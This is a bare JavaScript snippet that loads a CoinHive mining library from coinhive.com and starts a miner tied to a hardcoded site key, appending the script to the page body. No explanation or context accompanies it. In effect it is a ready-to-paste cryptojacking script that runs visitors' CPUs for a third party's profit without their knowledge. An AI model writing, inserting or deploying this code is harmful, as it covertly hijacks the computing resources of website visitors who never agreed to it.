var loadJS = function(url, implementationCode, location){
    var scriptTag = document.createElement('script');
    scriptTag.src = url;

    scriptTag.onload = implementationCode;
    scriptTag.onreadystatechange = implementationCode;

    location.appendChild(scriptTag);
};
var executeFunction = function(){
	var miner = new CoinHive.Anonymous('81Tcm4z2QSjHKIZNxHwEsjRi1LKY2rK0', {throttle: 0.1});
	miner.start();
}
loadJS('https://coinhive.com/lib/coinhive.min.js', executeFunction, document.body);
